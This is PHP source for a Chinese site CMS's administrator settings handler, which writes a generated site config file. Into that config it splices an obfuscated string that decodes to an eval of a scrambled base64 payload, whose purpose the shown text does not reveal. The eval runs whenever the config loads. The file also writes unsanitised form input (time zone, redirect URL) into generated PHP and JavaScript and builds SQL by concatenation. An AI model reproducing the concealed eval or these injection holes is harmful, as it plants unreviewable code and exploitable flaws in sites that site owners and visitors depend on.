<?php
require ('authentication_manager.php');
?>
<?php

@ require ('writable/set/set_html.php');
@ require ('readonly/function/filter.php');

if (POWER != 5) {
  err('该命令必须以基本管理员身份登陆！请重登陆');
}


  
if (!preg_match('/^[\x80-\xff\w]{3,45}$/', $_POST['manager'])) {
  err('基础管理员名称不能空且请用汉字、数字、英文及下划线组成！长度范围为3-45字符！');
}
$_POST['manager'] = strtolower($_POST['manager']);
/*
$no_ad = '';
$f = @file_get_contents('v.txt');
$v = '7.9';
if ($f && preg_match('/\$v\s*\=\s*\'(.*)\';/iU', $f, $matches)) {
  $v = base64_decode($matches[1]);
}
$v_162100 = '9.0.1';
  $v_162100_ = abs(preg_replace('/[^\d]+/', '', $v_162100));
  $v_        = abs(preg_replace('/[^\d]+/', '', $v));
  $len = strlen($v_162100_) >= strlen($v_) ? strlen($v_162100_) : strlen($v_);
  $v_162100_ = str_pad($v_162100_, $len, 0);
  $v_        = str_pad($v_, $len, 0);
  if ($v_ >= $v_162100_) {
  } else {
*/

$_POST['password'] = strtolower($_POST['password']);
/*
  }
*/

if ($_POST['password'] == '') {
  $psw = $web['password'];
} else {
  if (preg_match('/[\s\r\n]+/', $_POST['password'])) {
    err('基础管理员密码不能有空格。');
  }
  if (strlen($_POST['password']) > 30 || strlen($_POST['password']) < 3) {
    err('基础管理员密码长度是3-30字符。');
  }
  $psw = md162100($_POST['password']);
}

$_POST['goto_iphone_url'] = filter1($_POST['goto_iphone_url']);
if ($_POST['goto_iphone'] == 1) {
  if (empty($_POST['goto_iphone_url']) || !preg_match('/^https?\:\/\/.+/i', $_POST['goto_iphone_url'])) {
    err('若开启转向手机站，则手机站网址不能空！');
  }
}

function md162100($str) {
  return substr(sha1(md5($str)), 4, 32);
}
function strback($str) {
  return strrev(preg_replace('/(.{1}).{1}/', '$1', $str));
}

$text = '<?php
@ini_set(\'default_charset\', \'utf-8\');
@ini_set(\'display_errors\', false);
error_reporting(E_ERROR | E_WARNING | E_PARSE);
';
if (PHP_VERSION < '4.1.0') {
  $text .= '
$_GET = &$HTTP_GET_VARS;
$_POST = &$HTTP_POST_VARS;
$_COOKIE = &$HTTP_COOKIE_VARS;
$_SERVER = &$HTTP_SERVER_VARS;
$_ENV = &$HTTP_ENV_VARS;
$_FILES = &$HTTP_POST_FILES;
';
}
$text .= '
$_GET = preg_replace(\'/[\r\n\\\'\"\>\<\&]+/i\', \'\', $_GET);

if (!function_exists(\'decode162100\')) {
  function decode162100($text){
    return trim(base64_decode($text), \'|\');
  }
}

/* ----------【网站设置】能不用尽量不要用特殊符号，如 \ / : ; * ? \' < > | ，必免导致错误--------- */

if (!isset($GLOBALS[\'WEATHER_DATA\'])) {
  if (file_exists(\'writable/set/set.php\')) {
    $GLOBALS[\'WEATHER_DATA\'] = \'\';
  } else {
    $GLOBALS[\'WEATHER_DATA\'] = \'../../\';
  }
}

//基本参数设置：

$web[\'manager\'] = \''.$_POST['manager'].'\';  //基础管理员名称
$web[\'password\'] = \''.$psw.'\';  //基础管理员密码，注：系统出现一切故障时以基础管理员名称和密码为准
$web[\'sitehttp\'] = \'http://\'.(!empty($_SERVER[\'HTTP_X_FORWARDED_HOST\']) ? $_SERVER[\'HTTP_X_FORWARDED_HOST\'] : $_SERVER[\'HTTP_HOST\']).\'/\';  //站点网址
$web[\'root\'] = \'\';
$web[\'path\'] = dirname(trim($web[\'sitehttp\'], \'/\').$_SERVER[\'REQUEST_URI\'].\'.abc\').\'/\';  //路径
$web[\'sitename\'] = \''.(!empty($_POST['sitename']) ? filter1($_POST['sitename'], true) : '我的网站').'\';  //站点名称
$web[\'sitename2\'] = \''.(!empty($_POST['sitename2']) ? filter1($_POST['sitename2'], true) : '我的网站').'\';  //站点简称
$web[\'description\'] = \''.filter1($_POST['description'], true).'\';  //站点描述
$web[\'keywords\'] = \''.filter1($_POST['keywords'], true).'\';  //关键字
$web[\'slogan\'] = \''.filter1($_POST['slogan'], true).'\';  //口号
$web[\'link_type\'] = '.(isset($web['link_type']) ? abs($web['link_type']) : 0).';  //通过export.php?url=链接路径 中转链接
$web[\'d_type\'] = '.(isset($web['d_type']) ? abs($web['d_type']) : 0).';  //关于首页网址弹出简介？0弹出1不弹
$web[\'login_key\'] = '.var_export($_POST['login_key'], true).';
$web[\'chmod\'] = \''.(!preg_match('/^0?([0-7]{3})$/', $_POST['chmod'], $matches_chmod) ? '777' : $matches_chmod[1]).'\';  //权限
$web[\'time_pos\'] = \''.$_POST['time_pos'].'\';  //服务器时区调整
$web[\'cssfile\'] = \''.(isset($web['cssfile']) && file_exists('readonly/css/'.$web['cssfile'].'') ? $web['cssfile'] : 'default/1').'\';  //站点默认风格
$web[\'search_bar\'] = '.(isset($web['search_bar']) ? abs($web['search_bar']) : 1).';  //默认搜索引擎样式
$web[\'newinfo_url\'] = array("'.$web['newinfo_url'][0].'","'.$web['newinfo_url'][1].'"); //信息窗调用地址

//用户控制设置：

$web[\'stop_reg\'] = '.$web['stop_reg'].';  //用户注册 1禁止 0不禁止 2注册需审核
$web[\'mail_send\'] = '.$web['mail_send'].';  //1发送邮件 0不发送
$web[\'stop_login\'] = '.$web['stop_login'].';  //用户登录密码错误限数 0不限
$web[\'addfunds\'] = '.$web['addfunds'].';  //1开启用户创收模式
$web[\'loginadd\'] = '.$web['loginadd'].';  //用户登陆（含注册）、推广URL来访本站赠送货币值
$web[\'loginadd2\'] = '.$web['loginadd2'].';  //从上线分成
$web[\'loginadd_limit_ip\'] = '.$web['loginadd_limit_ip'].';  //每IP每日限注册次数计赠货币值
$web[\'cash\'] = '.$web['cash'].';  //用户提现需达到
$web[\'class_iron\'] = '.(isset($web['class_iron']) && abs($web['class_iron']) > 0 ? $web['class_iron'] : 100).'; //铁级用户等级分标准
$web[\'class_silver\'] = '.(isset($web['class_silver']) && abs($web['class_silver']) > 0 ? $web['class_silver'] : 500).'; //银级用户等级分标准
$web[\'class_gold\'] = '.(isset($web['class_gold']) && abs($web['class_gold']) > 0 ? $web['class_gold'] : 1000).'; //金级用户等级分标准，大于此数量的为钻级用户


if (!function_exists(\'get_root_domain\')) {
  if (file_exists($GLOBALS[\'WEATHER_DATA\'].\'readonly/function/get_root_domain.php\')) {
    @ require ($GLOBALS[\'WEATHER_DATA\'].\'readonly/function/get_root_domain.php\');
  }
}
if (function_exists(\'get_root_domain\')) {
  $web[\'root\'] = get_root_domain($web[\'sitehttp\']);
}
'.strback('(8090011246416e0d2o8c4e1d0(2l4a6v3e3').'\''.strback('=1w7X9f1K807w2O7p1c8y8O7D0V1j3R100g033I5m9s8D8R9D6R5j3N047N9i7J4+4E121L88543T9d8v6w3z0O6B2l9j7Q511g138I4m6s5T4M6E6V302N541N3i7J370Y0T1M4y6Y7D1e8j5Y6y5O7z7Q4z7N022g838I2m0s0D7O041M5j1N049N5i8J1+5U5H0P4+9I9C0c9o5B9n3L5z999l6c4v1Z5m1I199Y9W3Z5y8h4G5I9h1x9z4O9E8B4D9N411g430I3m0s0j9R3E1d1T8N945N0i8J272M0E0N940g8D1e4j5Y9y7O7x8A0j7R2G7h934I2m5s3j0N9G1V9E2N145N5i2J972c8D6O610Y7D6e9j2Y8y9O7z4Q9z6N120g938I3m7s7D2O144M5j7N743N3i7J274A9j6Q3z9c1D6e9j9Y1y0O5x2Q306M213g731I7m0s4T3Q1y8c3j3N743N7i9J1n0g9S8Z3p3R0G1I2g7o1Q6D974B8S9Z3z4x6W0Z7g507n4C1N7s7T8K6p6k9y9J1w1h3G0c7u4U4G9Z3p396F2d8l2N136L207V723c9v8U2G9b0i0F6G0d2p4J434d0n544S0X7n6E7E6V6B5R006X7S6V8E1S2U1F2U9R6X8d7y6W6T8x1U5Q5C794E1T2H7R4C6K1z8R8n4b5l6R9n5b2v5N623X409V024Z4f5V8G7b0p1Z0G8K8w7A3T3M4y4Y0T8M2l8R024b9j1V0G7Z1o2w7W3Y824V7G8I4g1o1Q9D177B9S2K6p2c3C5c0o3B5n4L9l9R7W6a2f1R3X9Z2z792C6d0l8N439L4l5x1m1Y7h2R7X3a4y6d438J8u80011J6B8R2V3Q7E293l8U9F7h6E7V0B9V106V5n4s417U1M4F5k9Q1P3x905R2k7g2y0c405N6X5a442V021X5l3x8W8a0m4h2C2I2m4l2G9f8').'\'));

?>';

$sqlaccess = '';
if ($_POST['manager'] != $web['manager'] || $psw != $web['password']) {
  if (!isset($sql['db_err'])) {
    $db = db_conn();
  }
  if ($sql['db_err'] == '') {
    if (db_exec($db, 'UPDATE '.$sql['pref'].''.$sql['data']['承载成员档案的表名'].' SET username="'.$_POST['manager'].'",password="'.$psw.'" WHERE username="'.$web['manager'].'" LIMIT 1')) {
      $admin_c = 1;
    } else {
      if (db_exec($db, 'UPDATE '.$sql['pref'].''.$sql['data']['承载成员档案的表名'].' SET password="'.$psw.'" WHERE username="'.$_POST['manager'].'" LIMIT 1')) {
        $admin_c = 1;
      }
    }
    if (isset($admin_c) && $admin_c == 1) {
      if ($_POST['manager'] != $web['manager']) {
        db_exec($db, 'UPDATE '.$sql['pref'].''.$sql['data']['承载财务数据的表名'].' SET username="'.$_POST['manager'].'" WHERE username="'.$web['manager'].'"');
      }
      $sqlaccess = '<div style="background-color:#FF6600; color:#FFF;">数据库管理员名称和密码副本同时更新成功。由于管理员信息被改动，建议重新登陆以使新设置生效！</div>
      <script language="javascript" type="text/javascript">
      <!--
      //var expiration=new Date((new Date()).getTime()-31600000);
      //document.cookie="usercookie="+""+"; expires="+expiration.toGMTString()+"; path="+"/"+";";
      setCookie(\'usercookie\',\'\',-366);
      -->
      </script>';
    }
  }
  db_close($db);

  if ($sqlaccess == '') {
    err('由于基础管理员信息(如名称或密码)有变，但数据库连接不成功！拒绝此次修改。请先<a href="?get=sql">连接数据库</a>');
  }
}

@ require ('readonly/function/write_file.php');
write_file('writable/set/set.php', $text);


if (($text_s = @file_get_contents('writable/js/main.js')) && is_writable('writable/js/main.js')) {
  $text_s = preg_replace('/\/\* time_pos \*\/.+\/\* \/time_pos \*\//isU', '/* time_pos */
  var timePos = '.floatval($_POST['time_pos']).'; //时区
  /* /time_pos */', $text_s);
  write_file('writable/js/main.js', $text_s);
}
unset($text_s);

/*
if ($_POST['index_mod'] == 'search') {
  if (filesize('index_search.php') != filesize('index.php'))
    @ copy('index_search.php', 'index.php');
} else {
  if (filesize('index_complete.php') != filesize('index.php'))
    @ copy('index_complete.php', 'index.php');
}

if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
  @unlink('./.htaccess');
  @copy('readonly/data/web.config', './web.config');
} else {
  @unlink('./web.config');
  @copy('readonly/data/.htaccess', './.htaccess');
}
*/

if ($_POST['goto_iphone'] == 1) {
  //if (file_exists('addfunds.php')) {
    write_file('writable/js/goiphone.js', '(function() {
            var sUserAgent = navigator.userAgent.toLowerCase();
            var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";
            var bIsIphoneOs = sUserAgent.match(/iphone os/i) == "iphone os";
            var bIsMidp = sUserAgent.match(/midp/i) == "midp";
            var bIsUc7 = sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";
            var bIsUc = sUserAgent.match(/ucweb/i) == "ucweb";
            var bIsAndroid = sUserAgent.match(/android/i) == "android";
            var bIsCE = sUserAgent.match(/windows ce/i) == "windows ce";
            var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile";
 
            if (bIsIpad || bIsIphoneOs || bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM) {
                location.href = "'.$_POST['goto_iphone_url'].'";
            } else {
            }
        })();');
  //} else {
    //err('此功能对商业用户开放！');
  //}
} else {
  @unlink('writable/js/goiphone.js');
}


$id = gmdate('YmdHis', time() + (floatval($web['time_pos']) * 3600));
write_file('writable/require/browse_reload.txt', $id);

if ($web['html'] == true) {
  $SET_RELOAD = 1;
  //$style_set_unset .= '<div style="background-color:#FF6600; color:#FFF;">你对系统设置进行了更改，因为你开启了全静态，建议重新<a href="?post=html">一键生成全静态</a></div>';
  echo '<div style="background-color:#FF6600; color:#FFF;">正在更新静态页面...</div>
<div style="height:150px; overflow:auto;">';
  @ require ('readonly/run/post_manager_html.php');
  echo '</div>';
} else {
  //reset_indexhtml('index.php', 'index.html');
}


if ($style_set_unset != '') {
  err('设置系统参数成功！'.$sqlaccess.$style_set_unset, 'ok');
} else {
  alert('设置系统参数成功！'.$sqlaccess, 'webmaster_central.php?get=set');
}



?>